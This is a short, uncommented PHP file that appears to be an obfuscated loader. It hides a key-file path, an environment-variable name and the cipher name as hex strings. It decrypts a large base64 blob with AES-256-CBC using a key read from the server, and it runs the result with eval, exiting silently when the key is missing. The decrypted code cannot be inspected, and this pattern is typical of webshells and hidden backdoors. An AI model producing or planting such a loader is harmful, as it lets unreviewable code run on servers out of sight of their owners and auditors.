<?php

$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('L1cm72MMUQqCnrJtHAxBFA==');

$c=base64_decode(

'hIZjvi2eHwu1DjYl0UoUzB8rnd7Y/lOftMi0fv/MxBwxT42nu9DSj9lxVmr42ShVJO0K8UM2YoZl' .
'8tnEHGvAe/bOHms/RFmVSWJ0wX2J5xU7c4W0EqtuyVYl85ia08czCZU6gZc7OOgWIfqjh8TyEliq' .
'SQRNHU+Er9sij4T8O6mPMOIiqQe9jxa9ER25xlie13Ca55HjEcguR5pWZQ4TGRePYbzY669QHnzm' .
'PKhHaU2HZnIj+YV57j5O08HQNY2oCnnVFRQMKJeMvBpzngf+aIwIVVR1hsHDVq3WhzWurSh5F2JY' .
'mbyci18ggZZrTF/Xk2CP661GGnslgpphtUnWbc2YNQunuhRBNsgJK/ctNNv3CJTQQnjyRDPYQ6eK' .
'ejWI0/aasxPlN3e2m/KlKU8g1nBJ1ibcQul7SDpD7xEiYUa1u30xwaPLcqZGuQfvh1iA4mK5+k1c' .
'9vFzNMtiahoU5UM3WTnjP4jlBtvDZ380EdsXWvKmMloBV4VPhlym48HGq4cBgXRnGXhDQhxXLpvs' .
'slbkUihffvv0hkUmD5OBW0SlH+dczH2ZzgmYBfmZucCiz6Q61FEcRGPaYsMQ1pZ2qOFSm9bikdDI' .
'rhp0XTBoXj31kbhmrqOmniGAwltqMOYih4Vee0Ew4us9v32JEc5j5e8xsGz2IhM7xTBkbtesL68q' .
'Ap2BQYKSnWJfXHNM2NB1XBmqFLmrLMVyjkow18SibpinCfgVEDeNqRQgJqtWA4P5yYfwPc8zHljc' .
'p87AOfR7EIMMOMN7aRMU49ls/AemMXF9pPfu6rTx6B/bBlrvV76ubs1ppJK8JLwmtR2jnNniln2+' .
'WE0VNWp9vM2tFBZJgReZt5hh7fgNkXQbV87ezBRxaix7DtjkiIIIfCU3UCQQVOz0zs7fPxmQWV15' .
'TaNkgwT1I8IeLcuIzNobigaaloBzUW6zd880FU6Zbd2ppNkdV57x8nJA1q0k1nnaBMXzH6Bb3QvG' .
'3+XInyi9ixP+2XtkXjHr99tOW3MpQNq6BNW71qJdqk+SdJkpDK+Csxh6JmT9hSOeX8EpJ16oPFnw' .
'yQlklVgJqJupMox05MAuVISSipqTpVoa340u0O5maOZkj//R4mXEsfQVtYd/zUlLeqzhaF2F/96X' .
'Ebx69ZrxFWerDxJjpOkpcmpWFWBJ4c6cJg25ek9Dp9gAEFuevwVoW9cT7ZMWvynlOvUAwagw75zR' .
'XzoAGIbPBD2pMjNBlmjLXnXHY+PznDSKW/KMhtijVtXDfnFQQzRFCTHRX2NlzY8D6nrQcMru0B9+' .
'tJ8iVMZ2/2xGWKqcdBHHxqUgx5qnGYKTRlzjRxgcN4f0f5Yi2z+xgL+5LosT3dPWae+Fw+vjva/A' .
'6z/oUaNKaR77Fd+NDjYFsQT88IGvzku2hksg1iN+fMWxvS5lra+YGiWl+LZP2M/QkGAcYustiTYi' .
'j58+n8D+bQ9RZ9oGIqiM97FTytqv4r13L/pj3Xj3tps46AZq9LQJrnellVRjuqJPwzvg4gMBKHHK' .
'KfEyYp9YDkDwTcq8jrWofCv+TSi1fWdSZnG9IBeutWduyFGlXfkqWH+SSiOAVhWgIMecjlALpFuh' .
'8Rzp8mrKs41QOUApsXqNT/d0qKkV+en3GkokDyqGUJY+n1VerEpXk401PTLgdxZ5nWlD/zVqu3KV' .
'dtvm3jLhG81f8yw6HRM+zKT1FKv+1/w8d50wYGgIwjkIC5VU6vtfKGG8LT/XiewtsEohP/GPRn8f' .
'YTZ3f3KkTk9ACcFgXXeqrrXumXH9QwB78G7Dg3sOSEX0pfMuKgY3Ni9SP4xkn8EWrlNotMjPB6cg' .
'RnsMU0Id1GsOI4tyb6KhfAOTd5RNqTyb9NsWTfQXIZiebsbbu+JM7mXy4HxVqG7AExfvcajlhHjS' .
'R2QxbrupGPu+YDHTa3mqHkU1RIaqQY2uXwNIB10NC7XSUYMol70J8u5G81NZlymJy9lKCXhXlLFN' .
'FLGCS2/d2NNMw6/Ix9y56B0kXBlcaLcoTuiu8v/ldSYI7PSSrVNbG7RUkdRYejXkkJijV/c6wGjr' .
'/Y0Gu+PMkCW01NoB9+OexVd0uypJHvvzFUOdjTquoBxr2CP1wDlSgU5tbkeOZpJVvpPra3zVuQSs' .
'Z4GGAqT4JdNkDsSJrEowSTqY2pmR6x6HVHQ1rWu5+vGsyosXNachDZLpMPyaua6bj0B7zlXBnYZI' .
'wSPIqmgtquoMRc4jMq/2MpAcHE+fnYHlsPCKNtQDdm2/VDpVxrRhL3ERLzoFhAJRHz22FIofck//' .
'3HjSwTjR0gKhnTkunt/82Ii+qkL0MyLdM6v3mpB4DMaZMUz0uXfPcJuMZ7BAgwqKWUWTTjGLqAiZ' .
'm+Q+Hp9XmIIV'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval('?>'.$d);

